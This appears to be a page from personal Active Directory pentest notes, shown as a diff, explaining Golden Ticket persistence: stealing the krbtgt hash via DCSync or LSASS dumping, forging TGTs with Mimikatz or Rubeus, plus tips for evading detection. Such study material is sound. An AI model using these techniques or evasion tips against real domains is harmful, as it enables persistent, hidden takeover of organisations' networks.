@@ -1,0 +1,3505 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Persistence · AD Pentest Notes</title>
+<meta name="description" content="Domain persistence: Golden/Silver/Diamond tickets, AdminSDHolder, DSRM, Skeleton Key.">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<button class="menu-toggle" id="menuToggle" aria-label="Menu">☰</button>
+<div class="layout">
+<nav class="side-nav" id="sideNav">
+<a class="brand" href="index.html"><span class="brand-mark">AD</span><span class="brand-txt">Active Directory<br><small>Pentest Notes</small></span></a>
+<div class="nav-search"><input type="text" id="navSearch" placeholder="Search all notes…  (press /)" autocomplete="off"><div id="searchResults" class="search-results"></div></div>
+<a class="nav-home" href="index.html">🏠 Overview</a>
+<a class="nav-home" href="search.html">🔎 Full-text search</a>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>📘 Things To Understand Prior</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="00_things-to-understand-prior.html#ad-components">AD Components</a></li>
+<li><a href="00_things-to-understand-prior.html#active-directory-components">🧱 Active Directory Components</a></li>
+<li><a href="00_things-to-understand-prior.html#active-directory-structure">Active Directory Structure</a></li>
+<li><a href="00_things-to-understand-prior.html#example-of-domain-and-forest.">Example of Domain and Forest.</a></li>
+<li><a href="00_things-to-understand-prior.html#ad-authentication">AD Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#kerberos-authentication">Kerberos Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#step-by-step-kerberos-authentication">🔁 Step-by-Step Kerberos Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#pac-privilege-attribute-certificate">PAC (Privilege Attribute Certificate)</a></li>
+<li><a href="00_things-to-understand-prior.html#sam-security-system">Sam Security &amp;amp; System</a></li>
+<li><a href="00_things-to-understand-prior.html#lssas-lsa">Lssas &amp;amp; LSA</a></li>
+<li><a href="00_things-to-understand-prior.html#ntds.dit">NTDS.dit</a></li>
+<li><a href="00_things-to-understand-prior.html#dpapi-credential-manager">Dpapi ( Credential Manager )</a></li>
+<li><a href="00_things-to-understand-prior.html#ekeys">Ekeys</a></li>
+<li><a href="00_things-to-understand-prior.html#a.-pass-the-key-kerberos">✔ A. Pass-The-Key (Kerberos)</a></li>
+<li><a href="00_things-to-understand-prior.html#b.-pass-the-hash-ntlm">✔ B. Pass-The-Hash (NTLM)</a></li>
+<li><a href="00_things-to-understand-prior.html#c.-silver-ticket-forging">✔ C. Silver Ticket Forging</a></li>
+<li><a href="00_things-to-understand-prior.html#d.-persistence">✔ D. Persistence</a></li>
+<li><a href="00_things-to-understand-prior.html#rid-enumeration-deep-dive-core-logic-brute-force-working-user-enumeration">🔥 RID Enumeration — Deep Dive (Core Logic + Brute Force Working) + User Enumeration</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>⚔️ Attacks + Lateral Movement</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="01_attacks-lateral-movement.html#bloodhound">BloodHound</a></li>
+<li><a href="01_attacks-lateral-movement.html#local-admin-hunting">Local Admin Hunting</a></li>
+<li><a href="01_attacks-lateral-movement.html#llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</a></li>
+<li><a href="01_attacks-lateral-movement.html#objective">🔍 Objective</a></li>
+<li><a href="01_attacks-lateral-movement.html#overview">🧭 Overview</a></li>
+<li><a href="01_attacks-lateral-movement.html#purpose-of-llmnrnbt-ns">📦 Purpose of LLMNR/NBT-NS</a></li>
+<li><a href="01_attacks-lateral-movement.html#llmnr---link-local-multicast-name-resolution">🔗 LLMNR - Link-Local Multicast Name Resolution</a></li>
+<li><a href="01_attacks-lateral-movement.html#nbt-ns---netbios-name-service">📛 NBT-NS - NetBIOS Name Service</a></li>
+<li><a href="01_attacks-lateral-movement.html#security-flaw-in-both-protocols">🚨 Security Flaw in Both Protocols</a></li>
+<li><a href="01_attacks-lateral-movement.html#real-world-exploitation-workflow">🎯 Real-World Exploitation Workflow</a></li>
+<li><a href="01_attacks-lateral-movement.html#differences-between-llmnr-nbt-ns">🧠 Differences Between LLMNR &amp;amp; NBT-NS</a></li>
+<li><a href="01_attacks-lateral-movement.html#quick-example-llmnrnbt-ns-poisoning-flow-with-responder">🧪 Quick Example – LLMNR/NBT-NS Poisoning Flow (with Responder)</a></li>
+<li><a href="01_attacks-lateral-movement.html#summary-table">🧾 Summary Table</a></li>
+<li><a href="01_attacks-lateral-movement.html#defense-tips">🛡️ Defense Tips</a></li>
+<li><a href="01_attacks-lateral-movement.html#attack-flow-example">🧪 Attack Flow Example</a></li>
+<li><a href="01_attacks-lateral-movement.html#tools-used">🛠️ Tools Used</a></li>
+<li><a href="01_attacks-lateral-movement.html#responder-options-and-usage">⚙️ Responder Options and Usage</a></li>
+<li><a href="01_attacks-lateral-movement.html#responder-output-log-files">📁 Responder Output: Log Files</a></li>
+<li><a href="01_attacks-lateral-movement.html#cracking-captured-ntlmv2-hash-with-hashcat">🔓 Cracking Captured NTLMv2 Hash with Hashcat</a></li>
+<li><a href="01_attacks-lateral-movement.html#required-open-ports-on-attacker-system-for-responder">🧨 Required Open Ports on Attacker System (for Responder)</a></li>
+<li><a href="01_attacks-lateral-movement.html#use-cases-after-cracking-hashes">🪪 Use Cases After Cracking Hashes</a></li>
+<li><a href="01_attacks-lateral-movement.html#tips">🧠 Tips</a></li>
+<li><a href="01_attacks-lateral-movement.html#recap-of-flow">🔄 Recap of Flow</a></li>
+<li><a href="01_attacks-lateral-movement.html#attack-workflow-windows-inveigh-based-llmnrnbt-ns-poisoning">🚩 Attack Workflow (Windows Inveigh-Based LLMNR/NBT-NS Poisoning)</a></li>
+<li><a href="01_attacks-lateral-movement.html#sample-output-of-c-inveigh-cli-based">🧮 Sample Output of C# Inveigh (CLI-based)</a></li>
+<li><a href="01_attacks-lateral-movement.html#post-capture-actions">🧑‍💻 Post-Capture Actions</a></li>
+<li><a href="01_attacks-lateral-movement.html#remediation-mitigation">🔐 Remediation &amp;amp; Mitigation</a></li>
+<li><a href="01_attacks-lateral-movement.html#smb-ntml-relay-attacks">SMB / NTML Relay Attacks</a></li>
+<li><a href="01_attacks-lateral-movement.html#as-rep-roasting">AS-REP Roasting</a></li>
+<li><a href="01_attacks-lateral-movement.html#kerberoasting">Kerberoasting</a></li>
+<li><a href="01_attacks-lateral-movement.html#dcsync">DCSync</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-hash">Pass The Hash</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-ticket">Pass The Ticket</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-certificate">Pass The Certificate</a></li>
+<li><a href="01_attacks-lateral-movement.html#priv-esc---across-domain-trusts---ad-cs">Priv Esc - Across domain trusts - AD CS</a></li>
+<li><a href="01_attacks-lateral-movement.html#what-is-certify">🔧 What is Certify?</a></li>
+<li><a href="01_attacks-lateral-movement.html#summary-of-escalation-techniques-used">🔐 Summary of Escalation Techniques Used</a></li>
+<li><a href="01_attacks-lateral-movement.html#background-ad-cs-cross-domain-trust">🔥 BACKGROUND: AD CS + Cross-Domain Trust</a></li>
+<li><a href="01_attacks-lateral-movement.html#esc3-exploiting-certificate-request-agent-misconfiguration">🔓 ESC3 — Exploiting Certificate Request Agent Misconfiguration</a></li>
+<li><a href="01_attacks-lateral-movement.html#escalation-to-enterprise-admin-ea-same-concept">🔥 Escalation to Enterprise Admin (EA) (Same concept)</a></li>
+<li><a href="01_attacks-lateral-movement.html#esc1-enrollee-supplies-subject-misconfiguration">🔥 ESC1 — Enrollee Supplies Subject Misconfiguration</a></li>
+<li><a href="01_attacks-lateral-movement.html#step-by-step-guide">🧭 Step-by-Step Guide</a></li>
+<li><a href="01_attacks-lateral-movement.html#shadow-key-credentials-attack">Shadow Key Credentials Attack</a></li>
+<li><a href="01_attacks-lateral-movement.html#gmsa">GMSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#laps">LAPS</a></li>
+<li><a href="01_attacks-lateral-movement.html#where-is-the-laps-password-stored-1">💻 Where is the LAPS Password Stored?</a></li>
+<li><a href="01_attacks-lateral-movement.html#as-an-attacker-why-you-care">🔍 As an Attacker: Why You Care</a></li>
+<li><a href="01_attacks-lateral-movement.html#how-to-enumerate-laps">🧪 How to Enumerate LAPS</a></li>
+<li><a href="01_attacks-lateral-movement.html#unconstrained-delegation">Unconstrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#constrained-delegation">Constrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#what-the-kdc-checks">What the KDC Checks</a></li>
+<li><a href="01_attacks-lateral-movement.html#enumeration-of-constrained-delegation">🔍 Enumeration of Constrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#exploiting-with-rubeus">🧪 Exploiting with Rubeus</a></li>
+<li><a href="01_attacks-lateral-movement.html#bonus-abuse-via-alternate-services-altservice">⚠️ Bonus: Abuse via Alternate Services (altservice)</a></li>
+<li><a href="01_attacks-lateral-movement.html#defensive-notes">🔐 Defensive Notes</a></li>
+<li><a href="01_attacks-lateral-movement.html#rbcd">RBCD</a></li>
+<li><a href="01_attacks-lateral-movement.html#conditions-to-perform-the-attack">Conditions to Perform the Attack</a></li>
+<li><a href="01_attacks-lateral-movement.html#step-2-s4u2proxy-second-hop">6️⃣ Step 2: S4U2Proxy (Second Hop)</a></li>
+<li><a href="01_attacks-lateral-movement.html#rodc-golden-ticket-keylist-attack---extra">RODC = Golden Ticket + Keylist Attack - Extra</a></li>
+<li><a href="01_attacks-lateral-movement.html#root-cause">🔑 Root Cause</a></li>
+<li><a href="01_attacks-lateral-movement.html#trust-is-controlled-by">❗ Trust is Controlled By:</a></li>
+<li><a href="01_attacks-lateral-movement.html#you-broke-the-model-by">🔥 You Broke the Model By:</a></li>
+<li><a href="01_attacks-lateral-movement.html#bad-successor-dmsa-abuse">Bad Successor ( dMSA Abuse )</a></li>
+<li><a href="01_attacks-lateral-movement.html#reality">Reality</a></li>
+<li><a href="01_attacks-lateral-movement.html#these-accounts-usually-have">These Accounts Usually Have</a></li>
+<li><a href="01_attacks-lateral-movement.html#msa">MSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#gmsa-1">gMSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#dmsa">dMSA</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🔑 Permissions Abuse</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="02_permissions-abuse.html#dacl-sacl">DACL &amp;amp; SACL</a></li>
+<li><a href="02_permissions-abuse.html#genericwrite">🔐 GenericWrite</a></li>
+<li><a href="02_permissions-abuse.html#generic-all">Generic All</a></li>
+<li><a href="02_permissions-abuse.html#write-dacl">Write DACL</a></li>
+<li><a href="02_permissions-abuse.html#all-extended-rights">All Extended Rights</a></li>
+<li><a href="02_permissions-abuse.html#write-owner">Write Owner</a></li>
+<li><a href="02_permissions-abuse.html#ou-abuse">OU Abuse</a></li>
+<li><a href="02_permissions-abuse.html#genericall-write-on-ou">GenericAll / Write on OU</a></li>
+<li><a href="02_permissions-abuse.html#gpo-abuse">GPO Abuse</a></li>
+</ul></div>
+<div class="nav-group open">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🔒 Persistence</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="03_persistence.html#golden-ticket-attack">Golden Ticket Attack</a></li>
+<li><a href="03_persistence.html#how-the-golden-ticket-attack-works-step-by-step">🔧 How the Golden Ticket Attack Works (Step-by-Step)</a></li>
+<li><a href="03_persistence.html#what-if-we-impersonate-a-non-existing-user">What if we impersonate a non-existing user?</a></li>
+<li><a href="03_persistence.html#step-1-obtain-the-krbtgt-hash">🔑 Step 1 — Obtain the krbtgt Hash</a></li>
+<li><a href="03_persistence.html#method-1-using-dcsync-most-common">Method 1 — Using DCSync (Most Common)</a></li>
+<li><a href="03_persistence.html#diamond-ticket-attack">Diamond Ticket Attack</a></li>
+<li><a href="03_persistence.html#sliver-ticket-attack">Sliver Ticket Attack</a></li>
+<li><a href="03_persistence.html#what-is-a-silver-ticket-attack">🚀 What is a Silver Ticket Attack?</a></li>
+<li><a href="03_persistence.html#step-by-step-exploitation">⚔️ Step-by-Step Exploitation</a></li>
+<li><a href="03_persistence.html#difference-between-golden-silver-diamond">Difference Between Golden Silver &amp;amp; Diamond</a></li>
+<li><a href="03_persistence.html#persistence-using-acl--adminsdholder---domain-persistence">Persistence using ACL -AdminSDHolder - Domain Persistence</a></li>
+<li><a href="03_persistence.html#dsrm-attack---domain-persistence">DSRM Attack - Domain Persistence</a></li>
+<li><a href="03_persistence.html#skeleton-key-attack">Skeleton Key Attack</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🌲 Forest privilege escalation / trust abuse technique</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#golden-ticket-attack-sid-prime-attack">Golden Ticket Attack + SID Prime Attack</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#extra-sid-attack">Extra Sid Attack</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#alternative-golden-ticket-via-rubeus">🧪 Alternative: Golden Ticket via Rubeus</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#step-8-dcsync-from-parent-domain-privilege-confirm">📤 Step 8: DCSync from Parent Domain (Privilege Confirm)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🖥️ TI interne</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="05_ti-interne.html#ère-étape-découverte-réseau">1ère étape – Découverte réseau</a></li>
+<li><a href="05_ti-interne.html#bloodhound">BloodHound</a></li>
+<li><a href="05_ti-interne.html#enum-acl">Enum ACL</a></li>
+<li><a href="05_ti-interne.html#énumération-ldap">Énumération LDAP</a></li>
+<li><a href="05_ti-interne.html#domain-computers-abus-machineaccountquota">Domain computers (abus MachineAccountQuota)</a></li>
+<li><a href="05_ti-interne.html#ipc-null-session-enumération-sid">IPC$ / null session → enumération SID</a></li>
+<li><a href="05_ti-interne.html#kerberoasting-aveugle-blind-kerberoast">Kerberoasting aveugle (blind kerberoast)</a></li>
+<li><a href="05_ti-interne.html#exploit-krb5.keytab">Exploit krb5.keytab</a></li>
+<li><a href="05_ti-interne.html#force-change-password">Force Change Password</a></li>
+<li><a href="05_ti-interne.html#generic-all-abus-complet-sur-un-objet">Generic All (abus complet sur un objet)</a></li>
+<li><a href="05_ti-interne.html#genericwrite-targeted-kerberoast-shadow-credentials">GenericWrite → Targeted Kerberoast / Shadow Credentials</a></li>
+<li><a href="05_ti-interne.html#backup-operators-locally">Backup Operators (locally)</a></li>
+<li><a href="05_ti-interne.html#templates-ad-cs-rappel">Templates AD CS (rappel)</a></li>
+<li><a href="05_ti-interne.html#ad-cs-énumération-et-exploitation-esc1-esc8">AD CS – Énumération et exploitation (ESC1 → ESC8)</a></li>
+<li><a href="05_ti-interne.html#gpo-abuse-privilege-escalation">GPO Abuse – Privilege Escalation</a></li>
+<li><a href="05_ti-interne.html#pass-the-hash-pth">Pass the Hash (PtH)</a></li>
+<li><a href="05_ti-interne.html#psexec">PSExec</a></li>
+<li><a href="05_ti-interne.html#smb-sans-signature-relais">SMB sans signature (relais)</a></li>
+<li><a href="05_ti-interne.html#ntlm-theft">NTLM theft</a></li>
+<li><a href="05_ti-interne.html#password-spraying-ntlm-http">Password Spraying (NTLM HTTP)</a></li>
+<li><a href="05_ti-interne.html#reverse-shell-windows-msfvenom-smb">Reverse shell Windows (msfvenom + SMB)</a></li>
+<li><a href="05_ti-interne.html#exfiltration-canaux-variés">Exfiltration (canaux variés)</a></li>
+<li><a href="05_ti-interne.html#évasion-av-powercat-download-cradle">Évasion AV (powercat / download-cradle)</a></li>
+<li><a href="05_ti-interne.html#génération-de-listes-dutilisateurs">Génération de listes d’utilisateurs</a></li>
+<li><a href="05_ti-interne.html#windows-privesc-résumé-des-vecteurs">Windows PrivEsc (résumé des vecteurs)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🌐 Pentest web</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="06_pentest-web.html#énumération">Énumération</a></li>
+<li><a href="06_pentest-web.html#apache-2.4.49-path-traversal-rce-cve-2021-41773">Apache 2.4.49 – Path Traversal / RCE (CVE-2021-41773)</a></li>
+<li><a href="06_pentest-web.html#php-wrappers-lfi">PHP wrappers / LFI</a></li>
+<li><a href="06_pentest-web.html#tomcat-war-reverse-shell">Tomcat – WAR reverse shell</a></li>
+<li><a href="06_pentest-web.html#bypass-auth-brute-force">Bypass auth – Brute force</a></li>
+<li><a href="06_pentest-web.html#cms">CMS</a></li>
+<li><a href="06_pentest-web.html#code-injection-payloads">Code injection – Payloads</a></li>
+<li><a href="06_pentest-web.html#ssti">SSTI</a></li>
+<li><a href="06_pentest-web.html#sql-injection">SQL Injection</a></li>
+<li><a href="06_pentest-web.html#nosql-injection">NoSQL Injection</a></li>
+<li><a href="06_pentest-web.html#xxe">XXE</a></li>
+<li><a href="06_pentest-web.html#xss">XSS</a></li>
+<li><a href="06_pentest-web.html#csrf-payloads">CSRF – Payloads</a></li>
+<li><a href="06_pentest-web.html#node.js-reverse-shell-deserialization">Node.js – Reverse shell (deserialization)</a></li>
+<li><a href="06_pentest-web.html#php-hmac">PHP – HMAC</a></li>
+<li><a href="06_pentest-web.html#docker-registry-enumération-via-curl">Docker registry – Enumération via curl</a></li>
+<li><a href="06_pentest-web.html#outils">Outils</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>☁️ Cloud &amp; K8s</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="07_cloud-k8s.html#docker-bases">Docker (bases)</a></li>
+<li><a href="07_cloud-k8s.html#kubernetes-kube">Kubernetes (Kube)</a></li>
+<li><a href="07_cloud-k8s.html#azure-cli-devops">Azure CLI (DevOps)</a></li>
+<li><a href="07_cloud-k8s.html#scénarios-dattaque-azure-devops-ci-cd">Scénarios d’attaque Azure DevOps / CI-CD</a></li>
+<li><a href="07_cloud-k8s.html#terraform-state-file-prise-de-contrôle-pipeline-study-case">Terraform state file → prise de contrôle pipeline (study case)</a></li>
+<li><a href="07_cloud-k8s.html#détection-de-vulnérabilités-iac-checkov-terra">Détection de vulnérabilités IaC (Checkov / Terra)</a></li>
+<li><a href="07_cloud-k8s.html#llm-prompt-injection">LLM (prompt injection)</a></li>
+<li><a href="07_cloud-k8s.html#owasp-top-10-cicd-security-risks">OWASP Top 10 CI/CD Security Risks</a></li>
+<li><a href="07_cloud-k8s.html#outils-daudit-k8s-cloud">Outils d’audit K8s / Cloud</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🧰 Priv escalation &amp; Tools</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="08_privesc-tools.html#linux-privesc">Linux PrivEsc</a></li>
+<li><a href="08_privesc-tools.html#reverse-shells">Reverse shells</a></li>
+<li><a href="08_privesc-tools.html#upgrade-shell-tty">Upgrade shell (TTY)</a></li>
+<li><a href="08_privesc-tools.html#pivoting-rpivot">Pivoting (rpivot)</a></li>
+<li><a href="08_privesc-tools.html#port-knocking">Port knocking</a></li>
+<li><a href="08_privesc-tools.html#python-jail-escape">Python jail escape</a></li>
+<li><a href="08_privesc-tools.html#insecure-deserialization-php">Insecure deserialization (PHP)</a></li>
+<li><a href="08_privesc-tools.html#bypass-command-line-obfuscation">Bypass command line (obfuscation)</a></li>
+<li><a href="08_privesc-tools.html#john-the-ripper">John the Ripper</a></li>
+<li><a href="08_privesc-tools.html#tls">TLS</a></li>
+<li><a href="08_privesc-tools.html#wayback-recon-passif">Wayback / recon passif</a></li>
+<li><a href="08_privesc-tools.html#google-dorks-extraits">Google Dorks (extraits)</a></li>
+<li><a href="08_privesc-tools.html#boîte-à-outils-tools">Boîte à outils (TOOLS)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>✅ Web Vulnerability Checklist</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="09_web-vuln-checklist.html#fa-bypass">2FA Bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#bypass">403 Bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#account-takeover-ato">Account Takeover (ATO)</a></li>
+<li><a href="09_web-vuln-checklist.html#admin-panel">Admin panel</a></li>
+<li><a href="09_web-vuln-checklist.html#aem-adobe-experience-manager">AEM (Adobe Experience Manager)</a></li>
+<li><a href="09_web-vuln-checklist.html#api-authentication-authorization">API Authentication / Authorization</a></li>
+<li><a href="09_web-vuln-checklist.html#authentication">Authentication</a></li>
+<li><a href="09_web-vuln-checklist.html#business-logic">Business Logic</a></li>
+<li><a href="09_web-vuln-checklist.html#cookie-attacks">Cookie Attacks</a></li>
+<li><a href="09_web-vuln-checklist.html#csrf">CSRF</a></li>
+<li><a href="09_web-vuln-checklist.html#exif-geolocation">EXIF / Geolocation</a></li>
+<li><a href="09_web-vuln-checklist.html#file-upload">File Upload</a></li>
+<li><a href="09_web-vuln-checklist.html#django-symfony">Django / Symfony</a></li>
+<li><a href="09_web-vuln-checklist.html#idor">IDOR</a></li>
+<li><a href="09_web-vuln-checklist.html#jira">Jira</a></li>
+<li><a href="09_web-vuln-checklist.html#mass-assignment">Mass Assignment</a></li>
+<li><a href="09_web-vuln-checklist.html#rate-limit-bypass">Rate limit bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#rce-chaînes">RCE (chaînes)</a></li>
+<li><a href="09_web-vuln-checklist.html#register">Register</a></li>
+<li><a href="09_web-vuln-checklist.html#reset-password">Reset password</a></li>
+<li><a href="09_web-vuln-checklist.html#rxss">RXSS</a></li>
+<li><a href="09_web-vuln-checklist.html#sql-injection-payloads">SQL injection (payloads)</a></li>
+<li><a href="09_web-vuln-checklist.html#tips-twitterveille">Tips (Twitter/veille)</a></li>
+</ul></div>
+</nav>
+<main class="content">
+
+<div class="page-head">
+  <div class="crumb"><a href="index.html">Notes</a> ›</div>
+  <h1 class="page-title">🔒 Persistence</h1>
+  <p class="page-desc">Domain persistence: Golden/Silver/Diamond tickets, AdminSDHolder, DSRM, Skeleton Key.</p>
+</div>
+<div class="article-wrap">
+  <article class="article"><h1 id="persistence">Persistence</h1>
+<h2 id="golden-ticket-attack">Golden Ticket Attack</h2>
+<h3 id="understanding-the-core-concept">Understanding The Core Concept</h3>
+<h3 id="what-is-a-golden-ticket">🔐 <strong>What Is a Golden Ticket?</strong></h3>
+<p>A <strong>Golden Ticket</strong> is a forged Kerberos <strong>TGT (Ticket Granting Ticket)</strong>, which uses the <strong>krbtgt account’s secret key</strong> to sign the ticket. Since all TGTs are signed by the <strong>krbtgt account</strong>, having its hash (or AES key) allows an attacker to <strong>create arbitrary TGTs</strong> for any user — even if that user doesn’t exist.</p>
+<hr />
+<h3 id="golden-ticket-rule-in-layman-terms">🧱 Golden Ticket Rule (in Layman Terms):</h3>
+<blockquote>
+<p>If an attacker has the krbtgt hash (or AES key), the domain SID, and other basic user info (e.g. username, group memberships), they can impersonate any user in the domain by crafting a fake TGT.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h3 id="core-ingredients-for-golden-ticket-attack">🧱 Core Ingredients for Golden Ticket Attack</h3>
+<p><strong>You need:</strong></p>
+<div class="line-block">Ingredient | Why it’s needed |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>krbtgt hash (NTLM or AES256)</strong> | To sign the fake TGT (like faking a stamp/seal) |</div>
+<div class="line-block"><strong>Domain SID</strong> | Uniquely identifies the domain |</div>
+<div class="line-block"><strong>User details (e.g., Administrator)</strong> | Who you want to impersonate |</div>
+<div class="line-block"><strong>Group SIDs</strong> | To inherit permissions like Domain Admin |</div>
+<div class="line-block"><strong>Domain info</strong> | e.g., FQDN, NetBIOS, PWDLastSet — for realism |</div>
+<hr />
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h2 id="how-the-golden-ticket-attack-works-step-by-step">🔧 How the Golden Ticket Attack Works (Step-by-Step)</h2>
+<hr />
+<p>✅ <strong>Step 1: Compromise the Domain</strong></p>
+<p>Before anything, the attacker must <strong>compromise a privileged account</strong>, usually a <strong>Domain Admin</strong>.</p>
+<p>This gives them access to read the memory or replicate secrets from the Domain Controller.</p>
+<hr />
+<p>✅ <strong>Step 2: Steal the krbtgt Account Hash</strong></p>
+<p>The <code>krbtgt</code> account is a special user in every AD domain — it’s used by the <strong>Kerberos service</strong> to <strong>sign Ticket Granting Tickets (TGTs)</strong>.</p>
+<p>The attacker needs the <strong>krbtgt password hash</strong>, especially the <strong>AES256 or NTLM hash</strong>, to <strong>forge their own TGTs</strong>.</p>
+<p>There are two common ways to get this:</p>
+<ul>
+<li><p><strong>Dump LSASS memory on the Domain Controller</strong> using Mimikatz or SafetyKatz.</p></li>
+<li><p><strong>Use DCSync</strong> to remotely request the krbtgt account’s password data (no code needed on DC).</p></li>
+</ul>
+<hr />
+<p><strong>Additonal Information:</strong></p>
+<p>The <strong><code>krbtgt</code> account</strong> is just like any other domain account — it has a password and derived Kerberos keys (NT hash, AES128, AES256, DES, etc.).</p>
+<p>On a <strong>Domain Controller (KDC)</strong>, those secrets are stored in <strong>Active Directory database (NTDS.dit).</strong></p>
+<p>Located at:</p>
+<pre class="powershell"><code>
+C:\Windows\NTDS\NTDS.dit
+</code></pre>
+<hr />
+<p>✅ <strong>Step 3: Forge the Golden Ticket</strong></p>
+<p>With the krbtgt hash in hand, the attacker uses tools like <strong>Rubeus</strong> or <strong>Mimikatz</strong> to <strong>forge a TGT</strong>.</p>
+<p>They can craft it to:</p>
+<ul>
+<li><p>Impersonate <strong>any user</strong> (even Administrator).</p></li>
+<li><p>Be a part of <strong>any group</strong> (like Domain Admins).</p></li>
+<li><p>Add details like password set date, group SIDs, etc., to make it look <strong>authentic</strong>.</p></li>
+<li><p>Make the ticket valid for <strong>10 years if they want</strong>.</p></li>
+</ul>
+<hr />
+<p><strong>Additonal Information:-</strong></p>
+<p>The <strong><code>krbtgt</code> account</strong> (which is used by the KDC to sign and encrypt Ticket Granting Tickets) maintains a <strong>password history of two previous keys by default</strong>. When you perform a Golden Ticket attack and sign a TGT using an <strong>old <code>krbtgt</code> AES key</strong> (from before a password change), the KDC can still validate and decrypt that TGT because it will try not only the current key but also the last one (sometimes two, depending on configuration).</p>
+<p>So even if the <code>krbtgt</code> password has been rotated, any ticket forged with one of the valid historical keys will still be accepted until both old keys have been cycled out (e.g., after two password changes).</p>
+<p><strong>⚠️ What this means:</strong></p>
+<ul>
+<li><p>If an attacker has extracted the <code>krbtgt</code> hash once, they can forge Golden Tickets that remain valid <strong>until the <code>krbtgt</code> password has been changed twice</strong>.</p></li>
+<li><p>This is why incident response teams are instructed to reset the <code>krbtgt</code> account <strong>twice in succession</strong>, ensuring all old keys are invalidated.</p></li>
+</ul>
+<hr />
+<p>✅ <strong>Step 4: Use the Ticket (God Mode Activated)</strong></p>
+<p>The attacker <strong>injects the forged ticket</strong> into memory on their system using <code>/ptt</code> (Pass-the-Ticket). Now, any requests they send to services (like SMB, LDAP, RDP) include this ticket.</p>
+<p>Since it looks legit, the DC doesn’t challenge it. The attacker now:</p>
+<ul>
+<li><p>Accesses sensitive servers</p></li>
+<li><p>Dumps password hashes</p></li>
+<li><p>Moves laterally</p></li>
+<li><p>Dumps or modifies Active Directory itself</p></li>
+</ul>
+<hr />
+<h3 id="why-its-so-dangerous">🧬 Why It’s So Dangerous</h3>
+<div class="line-block">Reason | Explanation |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>Bypasses Passwords &amp; MFA</strong> | Doesn’t matter what the user’s password is, or if MFA is enabled. |</div>
+<div class="line-block"><strong>Fully Offline</strong> | Once the ticket is forged, DC is not contacted again unless needed. |</div>
+<div class="line-block"><strong>Stealthy</strong> | No brute force, no malware needed on target — just a valid-looking ticket. |</div>
+<div class="line-block"><strong>Persistent</strong> | As long as krbtgt password remains the same, the attacker can keep forging tickets. |</div>
+<div class="line-block"><strong>Complete Control</strong> | Can impersonate any user, including domain admins, service accounts, etc. |</div>
+<blockquote>
+<p><strong>Note:- In real-world assessments, Golden Ticket attacks are typically avoided unless the objective is to test detection capabilities. This is because the attack involves the krbtgt account, which is a highly sensitive system account used by the Kerberos Key Distribution Center. You not find anywhere this account to be logged in accept DC.</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+<p><strong>The primary detection risk in a Golden Ticket attack isn’t the ticket forgery itself, but the act of obtaining the krbtgt hash — which typically requires access to a Domain Admin session on a Domain Controller. Logging in as a Domain Admin, through any machine which is not DC, generates Event ID 4624, which is closely monitored by most EDRs and SIEMs. As a result, this step can easily trigger alerts, making the operation high-risk from an opsec standpoint.</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+<p><strong>Only go after protected group accounts when no option is left because these account are highly monitored.</strong></p>
+</blockquote>
+<blockquote>
+
